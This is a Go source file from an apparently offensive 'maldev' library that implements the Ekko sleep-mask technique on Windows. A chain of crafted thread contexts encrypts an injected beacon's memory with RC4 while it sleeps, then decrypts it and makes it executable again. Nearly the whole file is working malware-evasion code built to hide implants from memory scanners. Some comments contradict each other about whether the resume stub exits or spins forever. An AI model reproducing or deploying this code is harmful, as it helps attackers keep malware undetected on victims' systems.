//go:build windows && amd64

package sleepmask

import (
	"context"
	"errors"
	"fmt"
	"runtime"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// EkkoStrategy is the L2-full strategy: a faithful port of Peter
// Winter-Smith's Ekko. Six CONTEXTs are crafted so that a chain of
// CreateTimerQueueTimer(NtContinue, &ctxN) diverts the pool thread
// through VirtualProtect(RW), SystemFunction032 (RC4 encrypt),
// WaitForSingleObjectEx (the actual sleep), SystemFunction032
// (decrypt), VirtualProtect(restore), and finally a resume stub that
// signals completion + exits. During the wait, the beacon thread's
// RIP sits inside VirtualProtect or SystemFunction032 or
// WaitForSingleObjectEx — never in Sleep/SleepEx.
//
// Constraints:
//   - windows + amd64 only (plan9 asm resume stub)
//   - Cipher must be *RC4Cipher (chain hardcodes SystemFunction032)
//   - Region size must fit in uint32 (SystemFunction032's USTRING.Length)
//   - runtime.LockOSThread is held during Cycle so the captured CONTEXT
//     corresponds to a stable OS thread
//   - Not safe for concurrent invocation (shared asm-globals feeding the
//     resume stub).
//
// Status: full ROP chain verified end-to-end via
// TestEkkoStrategy_CycleRoundTrip on Win10 amd64. Key design points:
//   - All 7 CONTEXTs + trampolines + USTR pool live in a page-aligned
//     VirtualAlloc'd scratch (16-byte alignment for FXSAVE).
//   - Each gadget's Rsp is placed with 8 KB of padding below it, so
//     the API function's stack grows into empty scratch, never into
//     our metadata. (This was the last bug: SF032's stack frame was
//     clobbering our slot table, breaking subsequent trampolines.)
//   - USTRING struct (ULONG Length, not USHORT) matches the advapi32
//     signature of SystemFunction032.
//   - Single timer kicks off the chain; trampolines drive the 5
//     remaining gadgets without additional timer races.
//   - resumeStub spins-forever after SetEvent (PAUSE/JMP) — can't call
//     ExitThread without corrupting thread-pool callback bookkeeping.
//   - DeleteTimerQueueEx(NULL) is non-blocking to avoid deadlock on
//     the spinning resume thread. One pool worker "leaks" per Cycle.
//   - Final gadget 4 restores the region to PAGE_EXECUTE_READ (the
//     typical post-inject state). Callers whose regions need a
//     different protection should use TimerQueueStrategy or
//     InlineStrategy.
type EkkoStrategy struct{}

// resumeStub is implemented in plan9 asm (strategy_ekko_amd64.s). Its
// address is used as Rip in the final CONTEXT of the chain. Never
// invoke it from Go code — it assumes a non-Go thread and calls
// ExitThread.
func resumeStub()

// Globals captured by the asm resume stub. Assigned before the first
// CreateTimerQueueTimer call of a Cycle.
var (
	ekkoResumeEvent    uintptr
	ekkoProcSetEvent   uintptr
	ekkoProcExitThread uintptr
)

// Scratch layout — a single VirtualAlloc'd RWX region, page-aligned
// (so automatically 16-byte aligned for FXSAVE targets).
//
// CRITICAL: Win32 API functions invoked by NtContinue use the caller's
// Rsp as their stack, growing DOWN from Rsp into lower addresses. If
// any of our metadata (trampolines, slot table, USTRs, key copy) sits
// in that downward-grow range, the function clobbers it mid-chain and
// subsequent trampolines load garbage ctx pointers. The layout below
// places each gadget's Rsp LOW, with only padding below for stack
// growth, and puts ALL read-back-by-chain metadata above the highest
// Rsp so it is never in any stack's downward-grow range.
//
//	+0x0000  (padding — gadget 0's stack grows down into this)
//	+0x2000  gadget 0 shadow frame (16 bytes, Rsp = +0x2008)
//	+0x2010  (padding — gadget 1's stack)
//	+0x4000  gadget 1 shadow frame (Rsp = +0x4008)
//	+0x4010  (padding — gadget 2's stack)
//	+0x6000  gadget 2 shadow frame (Rsp = +0x6008)
//	+0x8000  gadget 3 shadow frame (Rsp = +0x8008)
//	+0xA000  gadget 4 shadow frame (Rsp = +0xA008)
//	+0xC000  gadget 5 shadow frame (Rsp = +0xC008)
//	+0xE000  trampolines          6 × 0x30
//	+0xE120  ctx slot table       6 × 8
//	+0xE150  key copy             ≤ 0x40 bytes
//	+0xE190  USTR pool            32 bytes
//	+0xF000  contexts             7 × 0x500 (ctxMain + 6 gadgets) = 0x2300
//	         total scratch = 0x11300 < 128 KB
const (
	ekkoScratchSize = 128 * 1024

	ekkoShadowStride = 0x2000 // huge gap between gadget Rsps so each stack has 8 KB headroom
	ekkoShadowOffset = 0x2000
	ekkoShadowSlotOff = 0x08 // post-CALL alignment offset within each slot

	ekkoTrampOffset = 0xE000
	ekkoTrampStride = 0x30

	ekkoSlotsOffset = 0xE120

	ekkoKeyCopyOffset = 0xE150
	ekkoKeyCopyMax    = 0x40

	ekkoUSTROffset = 0xE190 // dataUSTR + keyUSTR (32 bytes)

	ekkoCtxOffset = 0xF000
	ekkoCtxStride = 0x0500
)

// ekkoLayout holds pointers into the scratch buffer. All pointers
// are page-aligned-derived, so all CONTEXT pointers satisfy FXSAVE's
// 16-byte alignment requirement.
type ekkoLayout struct {
	scratch uintptr
	ctxMain *api.Context64
	ctxs    [6]*api.Context64 // ProtRW, Encrypt, Wait, Decrypt, ProtRX, Resume
}

func newEkkoLayout() (*ekkoLayout, error) {
	addr, err := windows.VirtualAlloc(0, ekkoScratchSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("sleepmask/ekko: VirtualAlloc scratch: %w", err)
	}
	l := &ekkoLayout{scratch: addr}
	l.ctxMain = (*api.Context64)(unsafe.Pointer(addr + ekkoCtxOffset))
	for i := 0; i < 6; i++ {
		l.ctxs[i] = (*api.Context64)(unsafe.Pointer(addr + ekkoCtxOffset + uintptr(i+1)*ekkoCtxStride))
	}
	return l, nil
}

func (l *ekkoLayout) free() {
	windows.VirtualFree(l.scratch, 0, windows.MEM_RELEASE)
}

func (l *ekkoLayout) tramp(i int) uintptr {
	return l.scratch + ekkoTrampOffset + uintptr(i)*ekkoTrampStride
}

func (l *ekkoLayout) slotsBase() uintptr {
	return l.scratch + ekkoSlotsOffset
}

func (l *ekkoLayout) keyCopy() uintptr {
	return l.scratch + ekkoKeyCopyOffset
}

func (l *ekkoLayout) ustrDataPool() uintptr {
	return l.scratch + ekkoUSTROffset
}

func (l *ekkoLayout) ustrKeyPool() uintptr {
	return l.scratch + ekkoUSTROffset + 16
}

// shadowRsp returns the Rsp value for gadget i. Shadow slot base is
// 16-byte aligned; we offset by 8 so the function sees Rsp % 16 == 8
// at entry (post-CALL state expected by the Win64 ABI). The value
// written at the returned Rsp becomes the function's return address.
func (l *ekkoLayout) shadowRsp(i int) uintptr {
	return l.scratch + ekkoShadowOffset + uintptr(i)*ekkoShadowStride + 8
}

// buildChain writes the 6 trampolines, populates the slot table, copies
// the key into scratch, lays out the USTR pool, and fills the 6 gadget
// contexts. ctxMain must already be populated (RtlCaptureContext'd)
// before calling this.
func (l *ekkoLayout) buildChain(region Region, key []byte, d time.Duration, hDummy windows.Handle, origProtectPtr *uint32) error {
	if region.Size > 0xFFFFFFFF {
		return fmt.Errorf("sleepmask/ekko: region size %d exceeds USTRING.Length max (4 GiB)", region.Size)
	}
	if len(key) > ekkoKeyCopyMax {
		return fmt.Errorf("sleepmask/ekko: key size %d exceeds scratch key-copy slot %d", len(key), ekkoKeyCopyMax)
	}

	ntContinueAddr := api.ProcNtContinue.Addr()

	// Trampolines: each is 48 bytes of raw x64:
	//   MOVQ ctxSlot[i](RIP), CX   48 8B 0D rel32
	//   MOVQ $NtContinue, AX       48 B8 imm64
	//   JMP  AX                    FF E0
	for i := 0; i < 6; i++ {
		tr := l.tramp(i)
		b := unsafe.Slice((*byte)(unsafe.Pointer(tr)), ekkoTrampStride)
		b[0] = 0x48
		b[1] = 0x8B
		b[2] = 0x0D
		slotAddr := l.slotsBase() + uintptr(i)*8
		rel := int32(int64(slotAddr) - int64(tr+7))
		*(*int32)(unsafe.Pointer(&b[3])) = rel
		b[7] = 0x48
		b[8] = 0xB8
		*(*uint64)(unsafe.Pointer(&b[9])) = uint64(ntContinueAddr)
		b[17] = 0xFF
		b[18] = 0xE0
	}

	// Slot table: slots[i] is the address of the CONTEXT the trampoline
	// loads into RCX for NtContinue.
	slots := unsafe.Slice((*uintptr)(unsafe.Pointer(l.slotsBase())), 6)
	for i := 0; i < 6; i++ {
		slots[i] = uintptr(unsafe.Pointer(l.ctxs[i]))
	}

	// Copy the key into scratch so its address is stable (not on the Go
	// heap where GC could conceivably touch it; certainly not on a
	// goroutine stack that could move).
	keyBuf := unsafe.Slice((*byte)(unsafe.Pointer(l.keyCopy())), len(key))
	copy(keyBuf, key)

	// USTRING-shaped args for SystemFunction032.
	//   typedef struct _USTRING {
	//       ULONG  Length;        // NOT USHORT — this is USTRING, not UNICODE_STRING
	//       ULONG  MaximumLength;
	//       PVOID  Buffer;
	//   } USTRING;
	// Shared between encrypt and decrypt (RC4 is self-inverse; same data+key).
	writeUSTR := func(at uintptr, length uint32, buf uintptr) {
		*(*uint32)(unsafe.Pointer(at)) = length
		*(*uint32)(unsafe.Pointer(at + 4)) = length
		*(*uintptr)(unsafe.Pointer(at + 8)) = buf
	}
	dataUSTR := l.ustrDataPool()
	keyUSTR := l.ustrKeyPool()
	writeUSTR(dataUSTR, uint32(region.Size), region.Addr)
	writeUSTR(keyUSTR, uint32(len(key)), l.keyCopy())

	// setGadget: clone ctxMain into ctxs[i], patch Rip + Rsp + return hook.
	// ContextFlags forced to CONTEXT_CONTROL | CONTEXT_INTEGER (no FP/XSAVE)
	// so NtContinue does not try to restore the main thread's FXSAVE area
	// onto a pool thread with its own FPU state.
	const contextControlInteger = 0x00100003 // AMD64 | CONTROL | INTEGER
	setGadget := func(i int, rip uintptr, retTramp uintptr) *api.Context64 {
		c := l.ctxs[i]
		*c = *l.ctxMain
		c.ContextFlags = contextControlInteger
		c.Rip = uint64(rip)
		rsp := l.shadowRsp(i)
		*(*uintptr)(unsafe.Pointer(rsp)) = retTramp
		c.Rsp = uint64(rsp)
		return c
	}

	// Gadget 0: VirtualProtect(addr, size, PAGE_READWRITE, &origProtect)
	c := setGadget(0, api.ProcVirtualProtect.Addr(), l.tramp(1))
	c.Rcx = uint64(region.Addr)
	c.Rdx = uint64(region.Size)
	c.R8 = uint64(windows.PAGE_READWRITE)
	c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))

	// Gadget 1: SystemFunction032(dataUSTR, keyUSTR) — RC4 encrypt in place
	c = setGadget(1, api.ProcSystemFunction032.Addr(), l.tramp(2))
	c.Rcx = uint64(dataUSTR)
	c.Rdx = uint64(keyUSTR)

	// Gadget 2: WaitForSingleObjectEx(hDummy, d_ms, FALSE) — the real sleep
	c = setGadget(2, api.ProcWaitForSingleObjectEx.Addr(), l.tramp(3))
	c.Rcx = uint64(hDummy)
	c.Rdx = uint64(d / time.Millisecond)
	c.R8 = 0

	// Gadget 3: SystemFunction032 — RC4 decrypt (same args; self-inverse)
	c = setGadget(3, api.ProcSystemFunction032.Addr(), l.tramp(4))
	c.Rcx = uint64(dataUSTR)
	c.Rdx = uint64(keyUSTR)

	// Gadget 4: VirtualProtect(addr, size, PAGE_EXECUTE_READ, &tmp).
	// R8 is the NEW protection and is passed by value — we can't read it
	// from origProtect* at chain-run time (that value is produced by
	// gadget 0). We hard-code PAGE_EXECUTE_READ, which is the assumed
	// post-inject state of shellcode regions. Callers whose regions are
	// PAGE_EXECUTE_READWRITE should use TimerQueueStrategy or
	// InlineStrategy, which preserve arbitrary original protections.
	c = setGadget(4, api.ProcVirtualProtect.Addr(), l.tramp(5))
	c.Rcx = uint64(region.Addr)
	c.Rdx = uint64(region.Size)
	c.R8 = uint64(windows.PAGE_EXECUTE_READ)
	c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))

	// Gadget 5: resumeStub — SetEvent(hCompletion) + ExitThread(0).
	// Never returns, so no return tramp needed. Rsp still must satisfy
	// post-CALL alignment (% 16 == 8) for the asm stub's own CALLs.
	cResume := l.ctxs[5]
	*cResume = *l.ctxMain
	cResume.ContextFlags = contextControlInteger
	cResume.Rip = uint64(resumeStubAddr())
	cResume.Rsp = uint64(l.shadowRsp(5))
	// Leave [Rsp] as the SetEvent call's shadow-space arg for safety.
	*(*uintptr)(unsafe.Pointer(l.shadowRsp(5))) = 0

	return nil
}

// resumeStubAddr returns the entry PC of the plan9 asm resumeStub. For
// top-level Go funcs the function value holds a pointer to a descriptor
// whose first word is the entry PC.
func resumeStubAddr() uintptr {
	fn := resumeStub
	return **(**uintptr)(unsafe.Pointer(&fn))
}

func (s *EkkoStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	if _, ok := cipher.(*RC4Cipher); !ok {
		return fmt.Errorf("sleepmask/ekko: requires *RC4Cipher cipher, got %T", cipher)
	}
	if len(regions) != 1 {
		return errors.New("sleepmask/ekko: MVP supports exactly one region; multi-region chain is future work")
	}
	region := regions[0]

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hCompletion, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/ekko: CreateEvent completion: %w", err)
	}
	defer windows.CloseHandle(hCompletion)
	hDummy, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/ekko: CreateEvent dummy: %w", err)
	}
	defer windows.CloseHandle(hDummy)

	// Globals for the asm resume stub — assigned BEFORE timers are
	// scheduled so the pool thread sees populated values.
	ekkoResumeEvent = uintptr(hCompletion)
	ekkoProcSetEvent = api.ProcSetEvent.Addr()
	ekkoProcExitThread = api.ProcExitThread.Addr()

	layout, err := newEkkoLayout()
	if err != nil {
		return err
	}
	defer layout.free()

	// Capture this thread's CPU state into the 16-byte-aligned ctxMain
	// in scratch. RtlCaptureContext uses FXSAVE which faults on any
	// misaligned target.
	api.ProcRtlCaptureContext.Call(uintptr(unsafe.Pointer(layout.ctxMain)))

	var origProtect uint32
	if err := layout.buildChain(region, key, d, hDummy, &origProtect); err != nil {
		return err
	}

	r1, _, lastErr := api.ProcCreateTimerQueue.Call()
	if r1 == 0 {
		return fmt.Errorf("sleepmask/ekko: CreateTimerQueue: %w", lastErr)
	}
	hQueue := windows.Handle(r1)

	ntContinueAddr := api.ProcNtContinue.Addr()
	delayMs := uint32(d / time.Millisecond)

	// Schedule a SINGLE timer for gadget 0. The pool thread's NtContinue
	// kicks off the chain; trampolines drive the 5 remaining gadgets
	// without additional timers (which would race on ctx Rsp slots).
	var hTimer windows.Handle
	rc, _, cErr := api.ProcCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&hTimer)),
		uintptr(hQueue),
		ntContinueAddr,
		uintptr(unsafe.Pointer(layout.ctxs[0])),
		0, // fire immediately
		0, // one-shot
		0, // WT_EXECUTEDEFAULT
	)
	if rc == 0 {
		return fmt.Errorf("sleepmask/ekko: CreateTimerQueueTimer: %w", cErr)
	}

	// Block until the resume stub signals hCompletion, or watchdog
	// fires (delay + 5s grace).
	watchdog := uint32(delayMs + 5000)
	api.ProcWaitForSingleObject.Call(uintptr(hCompletion), uintptr(watchdog))

	// CompletionEvent = NULL → do NOT block waiting for callbacks to
	// finish. We can't wait because resumeStub's thread spins forever
	// (see asm file for why). The thread pool recycles the worker
	// later on its own schedule; this "leaks" one pool worker per Cycle.
	api.ProcDeleteTimerQueueEx.Call(uintptr(hQueue), 0)

	runtime.KeepAlive(key)

	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}
